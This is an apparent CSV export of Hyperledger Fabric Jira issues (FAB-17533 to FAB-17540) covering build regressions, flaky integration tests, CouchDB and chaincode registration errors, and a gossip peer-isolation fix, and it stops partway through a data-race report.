Avoid duplicating the contents of the cauthdsl package in pkg/config,FAB-17533,44407,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,sykesm,sykesm,25/Feb/20 8:05 AM,17/Mar/20 4:23 AM,28/Oct/23 3:09 AM,27/Feb/20 11:44 PM,,,,,,,,,,,,,,fabric-common,,,,,,,,,0,ipm,,,,,"The code added to implement the channel creation transaction made a copy of the bits of the policy parser into the pkg/config tree. ""A little copying"" is okay when done for small bits and to truncate the dependency tree but, in this case, we're making a copy of a large part of the existing implementation and we are still carrying the {{Knetic/govaluate}} dependency.

If cauthdsl has the code we need, we should try to work in that space to reduce the deps and refactor it for consumption as part of the library.",,caod,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzr",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Feb/20 4:12 AM;caod;[https://github.com/hyperledger/fabric/pull/739];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BYFN fails to package chaincode using chaincode lifecycle,FAB-17534,44408,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,btl5037,Aniket.1,Aniket.1,25/Feb/20 5:07 PM,27/Feb/20 11:54 PM,28/Oct/23 3:09 AM,27/Feb/20 11:54 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"===================== Anchor peers updated for org 'Org2MSP' on channel 'mychannel' ===================== 

 

+ peer lifecycle chaincode package mycc.tar.gz --path github.com/hyperledger/fabric-samples/chaincode/abstore/go/ --lang golang --label mycc_1

+ res=1

+ set +x

Error: error getting chaincode bytes: failed to calculate dependencies: incomplete package: github.com/hyperledger/fabric-chaincode-go/shim

!!!!!!!!!!!!!!! Chaincode packaging on peer0.org1 has failed !!!!!!!!!!!!!!!!

========= ERROR !!! FAILED to execute End-2-End Scenario ===========

 

ERROR !!!! Test failed",,Aniket.1,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019hf:",,,,Unset,Unset,,"> cd ./fabric-samples/first-network
> ./byfn.sh up",,Unset,,,,,,Unset,,Unset,,(Please add usage information),Aniket.1,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Feb/20 11:35 AM;btl5037;A regression was introduced yesterday, I've reverted that change and once merged should fix the problem:

[https://github.com/hyperledger/fabric-samples/pull/131];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent test failure in pvtdata integration suite - [Fail] PrivateData implicit collection [It] disseminates implicit collection data owned by the peer's org,FAB-17535,44410,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,wenjian,sykesm,sykesm,26/Feb/20 4:48 AM,04/Mar/20 1:08 AM,28/Oct/23 3:09 AM,03/Mar/20 12:42 PM,v2.0.0,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,ci-flake,,,,,"https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=8458&view=logs&j=17737827-9315-5d9e-c14a-16a17e90ef50&t=4c34d36c-6bff-5a33-cfcd-b209c5bac4c3&l=5946

{code}
2020-02-25T19:22:29.4671604Z [91m[1mâ€¢ Failure [75.951 seconds][0m
2020-02-25T19:22:29.4672264Z [90mPrivateData implicit collection [0m[91m[1m[It] disseminates implicit collection data owned by the peer's org  [0m
2020-02-25T19:22:29.4673027Z [37m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/pvtdata/implicit_coll_test.go:68[0m
2020-02-25T19:22:29.4673323Z 
2020-02-25T19:22:29.4673768Z   [91mNo future change is possible.  Bailing out early after 0.064s.
2020-02-25T19:22:29.4674134Z   Expected
2020-02-25T19:22:29.4674301Z       <int>: 1
2020-02-25T19:22:29.4674484Z   to match exit code:
2020-02-25T19:22:29.4674860Z       <int>: 0[0m
2020-02-25T19:22:29.4675108Z 
2020-02-25T19:22:29.4675403Z   /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/pvtdata/pvtdata_test.go:1125
{code}",,btl5037,denyeart,sykesm,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Feb/20 1:10 AM;sykesm;pvtdata-fail.txt;https://jira.hyperledger.org/secure/attachment/18144/pvtdata-fail.txt","26/Feb/20 4:48 AM;sykesm;pvtdata.log;https://jira.hyperledger.org/secure/attachment/18140/pvtdata.log",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i008rj:iwryq",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,sykesm,wenjian,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Feb/20 1:11 AM;sykesm;Hit it again today.

https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=8570&view=logs&j=17737827-9315-5d9e-c14a-16a17e90ef50&t=4c34d36c-6bff-5a33-cfcd-b209c5bac4c3&l=5407

 [^pvtdata-fail.txt] ;;;","28/Feb/20 7:52 AM;btl5037;And again:

[https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=8809&view=logs&j=17737827-9315-5d9e-c14a-16a17e90ef50&t=4c34d36c-6bff-5a33-cfcd-b209c5bac4c3&l=5381];;;","29/Feb/20 11:12 AM;denyeart;And again:

https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=8961&view=logs&jobId=7e1dd684-043b-58f9-3f54-f4b0baeb1973&j=7e1dd684-043b-58f9-3f54-f4b0baeb1973&t=83158a86-181c-5d3d-be25-1c6af30d94c1;;;","29/Feb/20 11:13 AM;denyeart;[~wenjian] I'll move this to the top of the backlog...;;;","03/Mar/20 3:29 AM;wenjian;Looking at the failure logs, they had the following warning:

{quote}[Org1.peer1] 2020-02-26 15:27:49.876 UTC [gossip.privdata] prepareBlockPvtdata -> WARN Could not fetch all missing eligible collection private write sets for block [9]. Will commit block with missing private write sets:[txID: cbb8e2619f6288a081839eb5fb0fdcbc1b98968906936034e7888f9f503dfc5f, seq: 0, namespace: kvexecutor, collection: _implicit_org_Org1MSP, hash: 180c138820afb9dfc411a97955bfdd8a63059e829472ff96005bee17060ec9cd{quote}

It means that *Org1.peer1* didn't receive the pvtdata disseminated from *Org1.peer0* when committing the tx. Root cause:
* current test doesn't wait for ack, so peer0 will return from endorsement w/o waiting for peer1 receiving the pvtdata. As a result, peer1 may or may not receive the disseminated pvtdata at the time of query (depending on which is done first, commit+query vs. dissemination).

Fix: change requiredPeerCount=1 so that pvtdata dissemination during endorsement will wait for the other peer's ack.

;;;","03/Mar/20 4:28 AM;wenjian;PR: https://github.com/hyperledger/fabric/pull/778/files;;;","03/Mar/20 7:04 AM;sykesm;[Fail] Pvtdata dissemination for implicit collection [It] disseminates pvtdata of implicit collection for the peer's own org but not implicit collection for another org 
/home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/pvtdata/pvtdata_test.go:1125

Related?

https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=9068&view=logs&jobId=7e1dd684-043b-58f9-3f54-f4b0baeb1973&j=7e1dd684-043b-58f9-3f54-f4b0baeb1973&t=83158a86-181c-5d3d-be25-1c6af30d94c1;;;","03/Mar/20 7:31 AM;sykesm;Pvtdata dissemination for implicit collection [It] disseminates pvtdata of implicit collection for the peer's own org but not implicit collection for another org 

https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=9068&view=logs&j=4c66e10c-0fd8-5a92-dd62-668e591d0491

again;;;","03/Mar/20 7:50 AM;wenjian;[~sykesm] Thank you. The last 2 flakes are the same issue. PR is ready for review:  https://github.com/hyperledger/fabric/pull/778;;;","04/Mar/20 1:08 AM;wenjian;After PR 778, found another test flake for dissemination timed out, so pushed another PR https://github.com/hyperledger/fabric/pull/786 to increase timeout. 

Build link and error: 
https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=9080&view=logs&j=7e1dd684-043b-58f9-3f54-f4b0baeb1973

{quote}2020-03-02T23:10:31.5005306Z [91m[e][35m[Org1.peer0][0m [33m2020-03-02 23:10:30.728 UTC [gossip.gossip] SendByCriteria -> WARN 128[0m Failed sending to 10.1.0.4:24514 error: timed out
2020-03-02T23:10:31.5006702Z [91m[e][35m[Org1.peer0][0m [31m2020-03-02 23:10:30.728 UTC [gossip.privdata] func1 -> ERRO 129[0m Failed disseminating private RWSet for TxID 88a3055f05e04fcd4379958593a6d17e76b655e576a9255c3c49bc9bb07eb04e , namespace _lifecycle collection _implicit_org_Org1MSP : {""failures"":{""timed out"":1}}{quote}
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Use k8s SDK instead of calling kubectl in operator,FAB-17536,44417,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,btl5037,btl5037,26/Feb/20 1:29 PM,06/May/20 2:34 AM,28/Oct/23 3:09 AM,06/May/20 2:34 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Instead of calling kubectl we should be using the actual k8s SDK. Making calls directly to the users binary means we can't control versioning. It also forces us to use the YTT tool which we can get rid of if calling k8s directly.,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz9",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Use docker SDK instead of calling docker-compose in operator,FAB-17537,44418,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,btl5037,btl5037,26/Feb/20 1:30 PM,11/Jan/21 3:06 AM,28/Oct/23 3:09 AM,11/Jan/21 3:06 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Instead of calling docker-compose we should be using the actual docker SDK. Making calls directly to the users binary means we can't control versioning. It also means we don't have to generate our own compose files.,,btl5037,shitaibin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0192i:z",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,shitaibin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Jul/20 6:22 PM;shitaibin;Can I take this task. And is there more detailed information for me to finish it?;;;","06/Jul/20 11:24 AM;shitaibin;[~btl5037] Can I take this task. And is there more detailed information for me to finish it?;;;","06/Jul/20 11:34 AM;btl5037;[~shitaibin], sorry, I missed your previous comment. Can you ping me on RocketChat sometime this week and we can discuss it. I'd love to see someone from the community work on this. This has been superseded by a different Jira which is encompassing a major rewrite I am actively working on, but I'd be more than happy to let someone pick up that part of it.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Container registration failed on chaincode commit along with couchdb batch update conflict,FAB-17538,44419,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Environment Issue,,Aniket.1,Aniket.1,26/Feb/20 5:02 PM,26/Apr/20 1:11 PM,28/Oct/23 3:09 AM,26/Apr/20 1:11 PM,v2.0.0,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"When I run below command to commit the chaincode using `chaincode lifecycle` which is approved and ready to commit:
{code:java}
./peer lifecycle chaincode commit -o orderer.example.org:7050 --channelID mychannel --name storage_chaincode --version v1 --sequence 1 --init-required --tls --cafile ./crypto-config/ordererOrganizations/example.org/orderers/orderer.example.org/msp/tlscacerts/tlsca.example.org-cert.pem
2020-02-26 13:19:47.045 IST [chaincodeCmd] ClientWait -> INFO 001 txid [d730ccd535f8bce2edb7baf25207c8c2d97985e3219393111b1de9cd45ae532d] committed with status (VALID) at
{code}
 

It shows no error but in peer logs, it shows:

 
{code:java}
2020-02-26 13:19:46.699 IST [gossip.privdata] prepareBlockPvtdata -> INFO 072 Successfully fetched all eligible collection private write sets for block [4] channel=mychannel
2020-02-26 13:19:46.700 IST [lifecycle] update -> INFO 073 Updating cached definition for chaincode 'storage_chaincode' on channel 'mychannel'
2020-02-26 13:19:46.705 IST [lifecycle] update -> INFO 074 Chaincode with package ID 'storage_chaincodev1:696e1856cb2f680764e0bb495793a485b9832b0d2e73fed19d75e28db02454e3' now available on channel mychannel for chaincode definition storage_chaincode:v1
2020-02-26 13:19:46.705 IST [cceventmgmt] HandleStateUpdates -> INFO 075 Channel [mychannel]: Handling deploy or update of chaincode [storage_chaincode]
2020-02-26 13:19:46.866 IST [statecouchdb] commitUpdates -> WARN 076 CouchDB batch document update encountered an problem. Reason:Document update conflict., Retrying update for document ID:namespaces/fields/storage_chaincode/EndorsementInfo
2020-02-26 13:19:46.901 IST [statecouchdb] commitUpdates -> WARN 077 CouchDB batch document update encountered an problem. Reason:Document update conflict., Retrying update for document ID:namespaces/fields/storage_chaincode/Sequence
2020-02-26 13:19:46.930 IST [statecouchdb] commitUpdates -> WARN 078 CouchDB batch document update encountered an problem. Reason:Document update conflict., Retrying update for document ID:namespaces/fields/storage_chaincode/ValidationInfo
2020-02-26 13:19:46.959 IST [statecouchdb] commitUpdates -> WARN 079 CouchDB batch document update encountered an problem. Reason:Document update conflict., Retrying update for document ID:namespaces/metadata/storage_chaincode
2020-02-26 13:19:46.985 IST [statecouchdb] commitUpdates -> WARN 07a CouchDB batch document update encountered an problem. Reason:Document update conflict., Retrying update for document ID:namespaces/fields/storage_chaincode/Collections
2020-02-26 13:19:47.044 IST [kvledger] CommitLegacy -> INFO 07b [mychannel] Committed block [4] with 1 transaction(s) in 345ms (state_validation=11ms block_and_pvtdata_commit=59ms state_commit=261ms) commitHash=[4f23756ab038bef3eb5b81ce61b38472101ebb32afc239b5043bb23ee663688b]
2020-02-26 13:19:47.047 IST [comm.grpc.server] 1 -> INFO 07c streaming call completed grpc.service=protos.Deliver grpc.method=DeliverFiltered grpc.request_deadline=2020-02-26T13:20:14.652+05:30 grpc.peer_address=127.0.0.1:54390 error=""context finished before block retrieved: context canceled"" grpc.code=Unknown grpc.call_duration=2.394955927s
2020-02-26 13:19:48.686 IST [lifecycle] Work -> WARN 07d could not launch chaincode 'storage_chaincodev1:696e1856cb2f680764e0bb495793a485b9832b0d2e73fed19d75e28db02454e3': chaincode registration failed: container exited with 0
{code}
As chaincode is not registered, I am not able to query/invoke it.

 

Chaincode container logs are as:



 
{code:java}
+ CHAINCODE_DIR=/usr/local/src
+ cd /usr/local/src
+ npm start -- --peer.address peer0.org1.example.org:7052
> storage@1.0.0 start /usr/local/src
> node storage.js ""--peer.address"" ""peer0.org1.example.org:7052""
2020-02-26T07:49:48.479Z info [c-api:lib/chaincode.js] Registering with peer peer0.org1.example.org:7052 as chaincode ""storage_chaincodev1:696e1856cb2f680764e0bb495793a485b9832b0d2e73fed19d75e28db02454e3""
 
2020-02-26T07:49:48.501Z error [c-api:lib/handler.js] Chat stream with peer - on error: %j ""Error: 14 UNAVAILABLE: failed to connect to all addresses\n at Object.exports.createStatusError (/usr/local/src/node_modules/grpc/src/common.js:91:15)\n at ClientDuplexStream._emitStatusIfDone (/usr/local/src/node_modules/grpc/src/client.js:233:26)\n at ClientDuplexStream._receiveStatus (/usr/local/src/node_modules/grpc/src/client.js:211:8)\n at Object.onReceiveStatus (/usr/local/src/node_modules/grpc/src/client_interceptors.js:1311:15)\n at InterceptingListener._callNext (/usr/local/src/node_modules/grpc/src/client_interceptors.js:568:42)\n at InterceptingListener.onReceiveStatus (/usr/local/src/node_modules/grpc/src/client_interceptors.js:618:8)\n at /usr/local/src/node_modules/grpc/src/client_interceptors.js:1127:18""
{code}
 

Similar previous issue: https://jira.hyperledger.org/browse/FAB-10558",,Aniket.1,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019ij:",,,,Unset,Unset,,Run the chaincode commit command ,,Unset,,,,,,Unset,,Unset,,(Please add usage information),Aniket.1,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Feb/20 3:13 PM;Aniket.1;I checked that with 'goleveldb', everything worked fine, problem seems when there is 'CouchDB';;;","19/Mar/20 1:57 PM;denyeart;[~Aniket.1] It looks like chaincode container can't connect back to peer at peer0.org1.example.org:7052. Is that the correct peer? Did you get it working?

BTW, I don't think the connection failure would be related to CouchDB.;;;","26/Apr/20 1:10 PM;denyeart;No response for a month, closing. If you can still reproduce, please attach full peer log and re-open.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Gossip - A peer gets isolated after a long period of disconnection,FAB-17539,44420,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,wenjian,lmars,lmars,26/Feb/20 6:08 PM,18/Sep/20 8:27 PM,28/Oct/23 3:09 AM,01/Sep/20 4:01 AM,v1.4.2,,,,,,,,,v1.4.9,v2.2.0,,,fabric-gossip,,,,,,,,,1,gossip,ipm2,operator,,,"FAB-15840 was fixed in v1.4.2, but we have the same problem on this version (please, see steps to reproduce)

I checked: [https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/discovery/discovery_impl.go#L32]
and found only 120 attempts to connect to anchor peers. And is that all? A peer gets isolated after that?

What should I do to fix this?",,C0rWin,denyeart,jyellick,lmars,lskor 1,mplisov,wenjian,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqi",,,,Unset,Unset,v2.x,"1. create network with two organizations (each with one peer)
2. break network between them
3. wait ""panic"" because of FAB-16292
4. restart peer's containers
5. wait more then 1 hour (120 attempts to reconnect)
6. restore network between peers",,Unset,,,,,,Unset,,Unset,,(Please add usage information),C0rWin,denyeart,jyellick,lmars,lskor 1,mplisov,wenjian,yacovm,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/Mar/20 1:47 PM;denyeart;[~yacovm] What's your opinion?;;;","19/Mar/20 5:20 PM;yacovm;We could certainly export the 120 to be configurable, however this also has issues because unless you put something insanely high, it's hard to predict period of time to be disconnected.

As of 1.4.x (for some x i don't remember), peers no longer forget bootstrap peers, however this is pretty useless since what we really need gossip for, is inter-org communication, so we should have really done it for anchor peers ;)

This is the reason Leonid's peers gets isolated from one another.

I think the *best fix* would be to simply make the [Connect()|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/discovery/discovery.go#L138] method which is used for both [anchor|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/gossip/gossip_impl.go#L258] peers and [bootstrap|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/gossip/gossip_impl.go#L1166] peers, add an endpoint to a set, which gossip will then check against when it decides to purge dead peers from memory or not.;;;","19/Mar/20 6:22 PM;C0rWin;> I think the best fix would be to simply make the Connect() method which is used for both anchor peers and bootstrap peers, add an endpoint to a set, which gossip will then check against when it decides to purge dead peers from memory or not.


This definitely make sense, so essentially you suggest to have list of non expendable peers which is never purged. I.e. each time we connect to an anchor or bootstrap we add them to that list, while during  ConfigUpdate where anchors are updated we also maintain that list accordingly. 

I also do think that regardless this 120 should be externalized to configuration and might be use some exponential back off.;;;","19/Mar/20 10:34 PM;yacovm;Yes, something along these lines.

Currently, peers are purged from the membership if they are dead for too long, to stop connecting to them. 
 If the peers are bootstrap peers, they are [not|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/discovery/discovery_impl.go#L1055] purged.

I propose to replace this check, with a check of some set *continuousEndpoints* which will be expanded when this *Connect()* method is called.

In more details: The Connect() method is used for two types of peers:
 * Bootstrap peers: This is used [once|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/gossip/gossip_impl.go#L1166], at the startup of the peer.
 * Anchor peers: This is used upon a config block update: The *GossipService* in *gossip/service* calls [JoinChan|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/service/gossip_service.go#L419] on the underlying *GossipImpl* in *gossip/gossip* which in turn calls [learnAnchorPeers|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/gossip/gossip_impl.go#L209] that [Connect()|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/gossip/gossip_impl.go#L258] on the discovery package. The discovery package itself tries to [connect|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/discovery/discovery_impl.go#L139] to the said endpoint according to some criteria.
 Unlike the bootstrap peers, the anchor peers can be dynamically removed and added upon demand, so we would need to maintain the set of *continousEndpoints* at runtime, throughout the lifetime of the peer.
 To do what, I propose to add a new method to the [discovery interface|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/discovery/discovery.go#L138]: *Disconnect(endpoint ... string)* which will be called with the old endpoints which are no longer in use as parameters. The old endpoints that are no longer in use, will be maintained per channel in the *GossipService* in *gossip/service* package. This will keep the discovery package channel-ignorant as it is now.
 Since several channels can point to the same anchor peer, and since we can have bootstrap peers that intersect with anchor peers, we can use simple reference counting- *Connect()* ing an endpoint will increase the count of the said endpoint by 1, and calling **Disconnect()* on it will decrease this counter (and if the number reaches zero then it will be removed from *continuousEndpoints*).

 ;;;","16/Jun/20 9:40 PM;yacovm;Another alternative option is to just maintain a set of *continousEndpoints* in the *gossip/service* struct since it has access to all [anchor peer updates|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/service/gossip_service.go#L397-L419], and make this set to be the union of all endpoints across all channels.

This set will be exposed to the the membership layer via an interface *IsContinuous(endpoint string)* which the membership layer will just use to see if it should [purge the dead endpoint or not|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/discovery/discovery_impl.go#L1055].;;;","16/Jun/20 9:56 PM;yacovm;Also we'd want to export [const msgExpirationFactor = 20|https://github.com/hyperledger/fabric/blob/a282f7132565d509d3ba6d502cd9c07cc5e567f0/gossip/discovery/discovery_impl.go#L30] to be configurable while we're at it ;;;","19/Jun/20 12:05 PM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1422];;;","25/Aug/20 3:56 PM;lmars;Excuse me, [~wenjian] [~yacovm] could you tell me how this PR fixes this bug?

I checked this PR and found that {{MaxConnectionAttempts = 120}} was preserved, so peer still stops the reconnection process after a few attempts?;;;","25/Aug/20 6:32 PM;yacovm;Anchor peers are no longer pruned from memory, so a peer will never stop attempting to connect to an anchor peer. 
By transitivity of gossip membership propagation + the fact that all peers know the same anchor peers they will re-establish membership once the network partition heals. ;;;","25/Aug/20 6:59 PM;lmars;{quote}Anchor peers are no longer pruned from memory,
{quote}
Yes. Good. I found this change in this PR. :+1:
{quote}so a peer will never stop attempting to connect to an anchor peer.
{quote}
Unfortunately, I couldn't found this. I checked {{Connect}} function, it is still finite.
 Could you point me, where is this function witch never stops connecting?!;;;","25/Aug/20 7:23 PM;yacovm;The connect function is only invoked when the peer restarts / gets a config update.

If the anchor peer is unreachable then for more than the finite amount of attempts, then it won't connect. 
However, if you managed to connect, then the peer can go offline and online indefinitely and you will still reconnect to it.;;;","26/Aug/20 12:09 AM;lmars;Thanks for explanation. Good fix ;) 

The last question :): are there any plans to backport this change to 1.4.x branch?;;;","26/Aug/20 12:32 AM;yacovm;I'm fine with backporting this, I think that [~wenjian] intended to do it.;;;","26/Aug/20 11:25 PM;denyeart;Yeah, [~wenjian] is looking into backport for v1.4.x, I've re-opened...;;;","27/Aug/20 1:16 AM;wenjian;Backported to release-1.4. PR: [https://github.com/hyperledger/fabric/pull/1815];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Data race reported from core/peer TestUpdateRootsFromConfigBlock/MutualTLSOrg1Org2,FAB-17540,44421,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,sykesm,sykesm,26/Feb/20 8:44 PM,14/Apr/20 11:10 PM,28/Oct/23 3:09 AM,14/Apr/20 11:10 PM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,race,,,,"Data race in the comm layer related to updating certificates from a config block.

{code}
